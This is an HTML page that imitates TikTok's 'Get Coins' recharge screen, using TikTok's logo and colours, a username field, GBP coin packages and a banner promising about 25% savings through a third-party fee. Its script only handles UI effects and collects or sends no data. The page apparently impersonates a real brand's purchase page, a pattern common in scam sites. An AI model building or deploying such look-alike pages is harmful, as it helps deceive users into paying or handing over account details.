<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TikTok - Get Coins</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  
  <script>
    tailwind.config = {
      theme: {
        extend: {
          colors: {
            tiktok: {
              primary: '#000000',
              secondary: '#262626',
              accent: '#FE2C55', // TikTok红
              light: '#F7F7F7',
              gray: '#E5E5E5',
              'gray-dark': '#999999',
              'gray-light': '#F2F2F2',
              'coin-yellow': '#FFD700'
            },
            loading: {
              blue: '#165DFF' // 加载圈蓝色
            }
          },
          fontFamily: {
            sans: ['Inter', 'Helvetica', 'Arial', 'sans-serif']
          },
          boxShadow: {
            'tiktok': '0 1px 2px rgba(0, 0, 0, 0.05)',
            'tiktok-hover': '0 2px 8px rgba(0, 0, 0, 0.08)'
          },
          keyframes: {
            bounce: {
              '0%, 100%': { transform: 'translateY(0)' },
              '50%': { transform: 'translateY(-8px)' },
            },
            spin: {
              '0%': { transform: 'rotate(0deg)' },
              '100%': { transform: 'rotate(360deg)' },
            }
          },
          animation: {
            bounce: 'bounce 1s infinite',
            spin: 'spin 1.5s linear infinite',
          }
        }
      }
    }
  </script>
  
  <style>
    /* 基础样式 */
    body {
      font-family: 'Inter', Helvetica, Arial, sans-serif;
      background-color: #FAFAFA;
      transition: padding-top 0.3s ease-out;
    }
    
    /* 当导航栏出现时，给body增加上边距 */
    body.body-with-header {
      padding-top: 6.5rem; /* 2.5rem (安全横幅) + 4rem (主导航栏) */
    }
    
    /* 动态文本下划线效果 */
    #user-input {
      text-decoration: none;
    }
    #user-input:not(:placeholder-shown) {
      text-decoration: underline dotted #f472b6 2px;
      text-underline-offset: 4px;
    }
  </style>
</head>

<body class="text-tiktok-primary bg-[#FAFAFA] min-h-screen">

  <div class="fixed top-0 left-0 right-0 z-50 bg-white border-b border-gray-200 h-10 flex items-center px-4 sm:px-6">
    <div class="flex items-center gap-2 text-base text-gray-800 font-semibold">
      <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-5 h-5 text-gray-600">
        <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75 11.25 15 15 9.75m-3-7.036A11.959 11.959 0 0 1 3.598 6 11.99 11.99 0 0 0 3 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285Z" />
      </svg>
      <span>Get Coins</span>
    </div>
  </div>


  <header id="popup-header" class="fixed top-10 left-0 right-0 z-40 bg-white border-b border-gray-200 shadow-sm transition-transform duration-300 ease-out -translate-y-full">
    <div class="container mx-auto px-4 h-16 flex items-center justify-between gap-2 sm:gap-4">
      <div class="flex items-center flex-shrink-0">
         <svg class="w-auto h-8" viewBox="0 0 118 42" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path fill="#25F4EE" d="M9.875 16.842v-1.119A8.836 8.836 0 008.7 15.64c-4.797-.006-8.7 3.9-8.7 8.707a8.706 8.706 0 003.718 7.135A8.675 8.675 0 011.38 25.55c0-4.737 3.794-8.598 8.495-8.707z"></path><path fill="#25F4EE" d="M10.086 29.526c2.14 0 3.89-1.707 3.967-3.83l.006-18.968h3.463a6.78 6.78 0 01-.11-1.202h-4.726l-.006 18.969a3.978 3.978 0 01-3.967 3.829 3.93 3.93 0 01-1.846-.46 3.949 3.949 0 003.22 1.662zM23.992 13.166v-1.055a6.506 6.506 0 01-3.583-1.068 6.571 6.571 0 003.583 2.123z"></path><path fill="#FE2C55" d="M20.409 11.043a6.54 6.54 0 01-1.616-4.315h-1.265a6.557 6.557 0 002.88 4.316zM8.706 20.365a3.98 3.98 0 00-3.973 3.976c0 1.528.869 2.858 2.134 3.523a3.936 3.936 0 01-.754-2.321 3.98 3.98 0 013.973-3.976c.409 0 .805.07 1.175.185v-4.833a8.837 8.837 0 00-1.175-.083c-.07 0-.134.006-.204.006v3.708a3.999 3.999 0 00-1.176-.185z"></path><path fill="#FE2C55" d="M23.992 13.166v3.676c-2.453 0-4.727-.786-6.58-2.116v9.621c0 4.802-3.902 8.714-8.706 8.714a8.669 8.669 0 01-4.988-1.579 8.69 8.69 0 006.368 2.781c4.797 0 8.707-3.906 8.707-8.714v-9.621a11.25 11.25 0 006.579 2.116v-4.73c-.48 0-.94-.052-1.38-.148z"></path><path fill="black" d="M17.413 24.348v-9.622a11.251 11.251 0 006.58 2.116v-3.676a6.571 6.571 0 01-3.584-2.123 6.61 6.61 0 01-2.888-4.315H14.06l-.006 18.968a3.978 3.978 0 01-3.967 3.83A3.99 3.99 0 016.86 27.87a3.991 3.991 0 01-2.133-3.523A3.98 3.98 0 018.7 20.372c.409 0 .805.07 1.175.185v-3.708c-4.701.103-8.495 3.964-8.495 8.701 0 2.29.888 4.373 2.338 5.933a8.669 8.669 0 004.988 1.58c4.798 0 8.707-3.913 8.707-8.714zM30.048 13.179h14.774l-1.354 4.232h-3.832v15.644h-4.778V17.41l-4.804.006-.006-4.238zM69.032 13.179h15.12l-1.355 4.232h-4.17v15.644h-4.785V17.41l-4.804.006-.006-4.238zM45.73 19.502h4.733v13.553h-4.708l-.026-13.553zM52.347 13.128h4.733v9.257l4.689-4.61h5.646l-5.934 5.76 6.644 9.52h-5.213l-4.433-6.598-1.405 1.362v5.236H52.34V13.128h.006zM102.49 13.128h4.734v9.257l4.688-4.61h5.647l-5.934 5.76 6.643 9.52h-5.206l-4.433-6.598-1.405 1.362v5.236h-4.734V13.128zM48.093 17.954a2.384 2.384 0 002.382-2.384 2.384 2.384 0 10-2.382 2.384z"></path><path fill="#25F4EE" d="M83.544 24.942a8.112 8.112 0 017.474-8.087 8.748 8.748 0 00-.709-.026c-4.478 0-8.106 3.631-8.106 8.113 0 4.482 3.628 8.113 8.106 8.113.21 0 .498-.013.71-.026-4.178-.326-7.475-3.823-7.475-8.087z"></path><path fill="#FE2C55" d="M92.858 16.83c-.217 0-.505.012-.716.025a8.111 8.111 0 017.468 8.087 8.112 8.112 0 01-7.468 8.087c.211.02.499.026.716.026 4.478 0 8.106-3.631 8.106-8.113 0-4.482-3.628-8.113-8.106-8.113z"></path><path fill="black" d="M91.58 28.887a3.94 3.94 0 01-3.94-3.945 3.94 3.94 0 117.882 0c0 2.18-1.77 3.945-3.942 3.945zm0-12.058c-4.477 0-8.106 3.631-8.106 8.113 0 4.482 3.629 8.113 8.106 8.113 4.478 0 8.106-3.631 8.106-8.113 0-4.482-3.628-8.113-8.106-8.113z"></path></svg>
      </div>
      
      <div class="flex-1 min-w-0 mx-2">
        <div class="relative">
          <input type="text" placeholder="Search" 
                 class="w-full bg-gray-100 rounded-full py-2 px-4 pl-10 text-sm focus:outline-none focus:ring-1 focus:ring-tiktok-accent/50">
          <i class="fas fa-search absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400 text-sm"></i>
        </div>
      </div>
      
      <div class="flex items-center space-x-2 sm:space-x-4 flex-shrink-0">
        <button class="bg-tiktok-accent text-white font-semibold px-4 sm:px-6 py-2 rounded-md transition hover:bg-red-600">Log in</button>
        <button class="text-gray-800 text-xl hover:text-black transition"><i class="fas fa-ellipsis-v"></i></button>
      </div>
    </div>
  </header>


  <main class="container mx-auto px-4 py-6">
    <div class="bg-white rounded-xl shadow-tiktok p-4 md:p-6 max-w-md mx-auto">
      <div class="flex-1 min-w-0">
        <div class="flex items-center justify-between gap-4 mb-6">
          <h1 class="text-2xl font-bold flex-shrink-0">Get Coins</h1>
          <a href="#" class="text-sm font-medium text-gray-700 hover:text-tiktok-accent transition whitespace-nowrap">View transaction history</a>
        </div>
        
        <div class="relative mb-6">
          <input type="text" id="user-input" placeholder="Enter username" 
                 class="w-full bg-gray-100 rounded-lg py-3 px-5 text-base focus:outline-none">
          <button id="clear-input-btn" class="absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600 hidden">
            <i class="fas fa-times-circle"></i>
          </button>
        </div>

        <div class="bg-red-50 border border-red-100 rounded-lg p-3 mb-6">
          <p class="text-tiktok-accent text-sm flex items-start">
            <i class="fas fa-info-circle mt-0.5 mr-2"></i>
            <span>Recharge: Save around 25% with a lower third-party service fee.</span>
          </p>
        </div>
      
        <div class="mb-8">
            <div class="grid grid-cols-2 sm:grid-cols-3 gap-3">
              <div class="coin-option bg-tiktok-accent/10 border-2 border-tiktok-accent rounded-lg p-4 cursor-pointer shadow-tiktok-hover">
                <div class="flex items-center justify-center mb-1"><i class="fas fa-coins text-tiktok-coin-yellow mr-1"></i><span class="font-bold">30</span></div>
                <p class="text-center font-medium">£0.29</p>
              </div>
              <div class="coin-option bg-white border border-tiktok-gray rounded-lg p-4 cursor-pointer hover:border-tiktok-accent hover:shadow-tiktok-hover">
                <div class="flex items-center justify-center mb-1"><i class="fas fa-coins text-tiktok-coin-yellow mr-1"></i><span class="font-bold">350</span></div>
                <p class="text-center font-medium">£3.30</p>
              </div>
              <div class="coin-option bg-white border border-tiktok-gray rounded-lg p-4 cursor-pointer hover:border-tiktok-accent hover:shadow-tiktok-hover">
                <div class="flex items-center justify-center mb-1"><i class="fas fa-coins text-tiktok-coin-yellow mr-1"></i><span class="font-bold">700</span></div>
                <p class="text-center font-medium">£6.59</p>
              </div>
              <div class="coin-option bg-white border border-tiktok-gray rounded-lg p-4 cursor-pointer hover:border-tiktok-accent hover:shadow-tiktok-hover">
                <div class="flex items-center justify-center mb-1"><i class="fas fa-coins text-tiktok-coin-yellow mr-1"></i><span class="font-bold">1,400</span></div>
                <p class="text-center font-medium">£13.19</p>
              </div>
              <div class="coin-option bg-white border border-tiktok-gray rounded-lg p-4 cursor-pointer hover:border-tiktok-accent hover:shadow-tiktok-hover">
                <div class="flex items-center justify-center mb-1"><i class="fas fa-coins text-tiktok-coin-yellow mr-1"></i><span class="font-bold">3,500</span></div>
                <p class="text-center font-medium">£32.95</p>
              </div>
              <div class="coin-option bg-white border border-tiktok-gray rounded-lg p-4 cursor-pointer hover:border-tiktok-accent hover:shadow-tiktok-hover">
                <div class="flex items-center justify-center mb-1"><i class="fas fa-coins text-tiktok-coin-yellow mr-1"></i><span class="font-bold">7,000</span></div>
                <p class="text-center font-medium">£65.85</p>
              </div>
            </div>
        </div>
      </div>
    </div>
  </main>
  
  <script>
    document.addEventListener('DOMContentLoaded', () => {
      // 获取元素
      const userInput = document.getElementById('user-input');
      const popupHeader = document.getElementById('popup-header');
      const clearInputBtn = document.getElementById('clear-input-btn');
      const bodyEl = document.body;

      // 弹出/推开导航栏的逻辑
      userInput.addEventListener('focus', () => {
        popupHeader.classList.remove('-translate-y-full'); // 让导航栏滑入
        bodyEl.classList.add('body-with-header'); // 让主内容区向下移动
      });
      
      // 清除按钮的显示/隐藏逻辑
      userInput.addEventListener('input', () => {
        clearInputBtn.classList.toggle('hidden', userInput.value.length === 0);
      });

      clearInputBtn.addEventListener('click', () => {
        userInput.value = '';
        clearInputBtn.classList.add('hidden');
        userInput.focus();
      });

    });
  </script>
</body>
</html>
